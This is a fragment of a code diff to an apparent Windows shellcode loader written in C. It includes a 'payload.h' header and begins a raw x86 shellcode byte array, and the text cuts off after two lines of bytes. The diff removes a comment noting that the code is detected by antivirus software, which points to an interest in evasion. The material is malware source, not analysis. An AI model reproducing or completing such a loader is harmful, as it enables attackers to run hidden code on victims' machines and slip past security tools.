@@ -1,6 +1,7 @@
 #include <windows.h>
 #include "payload.h"
-//On some PC it doesnt work, point is, its detected by antiviruses
+
+//32 bit shellcode
 char shellcode[] = {
     "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
     "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
